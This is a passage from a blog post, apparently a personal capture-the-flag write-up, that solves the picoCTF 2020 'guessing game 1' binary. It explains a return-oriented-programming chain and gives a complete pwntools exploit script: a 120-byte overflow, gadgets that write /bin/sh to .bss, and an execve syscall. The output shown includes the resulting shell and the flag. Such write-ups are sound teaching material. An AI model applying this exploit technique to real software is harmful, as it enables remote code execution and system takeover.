</ul>
<p>Now, we need to chain all these gadgets. Since we won&rsquo;t be able to store the
string onto the stack, we need to write <code>/bin/sh</code> into <code>.bss</code> section. How we
are going to do is to bring the address of <code>.bss</code> section into <code>rsi</code> register
since it is the file path argument for <code>execve()</code>. Then, we will have one of the
registers hold <code>/bin/sh</code> string. After that, we will use this instruction
<code>0x47ff91 mov qword ptr [rsi], rax ; ret;</code> to assign the string value to the
memory address that <code>rsi</code> register has. This will make sure that the address of
<code>.bss</code> points to the start of <code>/bin/sh</code> (we will later bring this address into <code>rdi</code>).</p>
<p>It is important to realize what gadgets we are allowed to use and use them
wisely to craft the chain. In this case, we have a gadget allows us to move
something from rax into the memory address pointed by rsi and we have gadgets
that do <code>pop rsi</code>, <code>mov rax</code>, and <code>pop rax</code>. So it makes sense that move the
address of <code>.bss</code> segment into rsi, put the string value into rax by popping
rax, move that rax&rsquo;s value into the memory address stored in rsi, then finally
move <code>.bss</code> address into rdi by popping rdi register (I am reiterating a lot but
this is needed to make sure I understand what is going on).</p>
<p>I came up with this python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;jupiter.challenges.picoctf.org&#34;</span>, <span style="color:#ae81ff">26735</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># good luck pwning :)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bss_addr <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x6bc3a0</span>)
</span></span><span style="display:flex;"><span>    syscall <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40137c</span>)
</span></span><span style="display:flex;"><span>    bin_sh <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x68732f6e69622f</span>) <span style="color:#75715e"># /bin/sh in little endian</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x400696</span>)
</span></span><span style="display:flex;"><span>    pop_rsi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x410ca3</span>)
</span></span><span style="display:flex;"><span>    pop_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x44a6b5</span>)
</span></span><span style="display:flex;"><span>    pop_rax <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4163f4</span>)
</span></span><span style="display:flex;"><span>    mov_str_to_bss <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x47ff91</span>)
</span></span><span style="display:flex;"><span>    execve_num <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x3b</span>)
</span></span><span style="display:flex;"><span>    clear_rax <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x445950</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we know that the offset to the ret address within the win() is 120 bytes</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">120</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we want &#39;rsi&#39; register to have the address to .bss seg</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rsi
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> bss_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># we put /bin/sh string into a temp register (in our case, rax)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># then we move that str value to be pointed by rsi&#39;s mem address of .bss seg</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rax
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> bin_sh
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> mov_str_to_bss
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># clear rax by xor&#39;ing then mov 59 or hex 0x3b into rax for execve() syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> clear_rax <span style="color:#75715e"># might not be necessary</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rax
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> execve_num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># bring .bss address which points to the start of /bin/sh into rdi for execve()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rdi
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> bss_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># clear rsi and rdx (null)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rsi
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_rdx
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># syscall!</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> syscall
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># beginning of the program</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 84 is the first sequence of the randomly generated numbers: rand() % 100 + 1</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;84&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>The result:</p>
<pre tabindex="0"><code>$ python3 solve.py                                                                                            1 ⚙
[*] &#39;/home/kali/ctf/picoctf2020/guessing-game-1/vuln&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to jupiter.challenges.picoctf.org on port 26735: Done
b&#39;first: /bin/sh\x00&#39;
b&#39;second: hs/nib/&#39;
[*] Switching to interactive mode
Welcome to my guessing game!

What number would you like to guess?
Congrats! You win! Your prize is this print statement!

New winner!
Name? Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa3\x0c

$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b751b438dd8c4bb7}$
</code></pre><p>Nice! Thank you for reading.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
      <li><a href="https://joonkim0625.github.io/tags/picoctf-2020/">PicoCTF 2020</a></li>
      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
      <li><a href="https://joonkim0625.github.io/tags/binary-exploit/">Binary Exploit</a></li>
      <li><a href="https://joonkim0625.github.io/tags/ida/">IDA</a></li>
      <li><a href="https://joonkim0625.github.io/tags/python/">Python</a></li>
      <li><a href="https://joonkim0625.github.io/tags/script/">Script</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
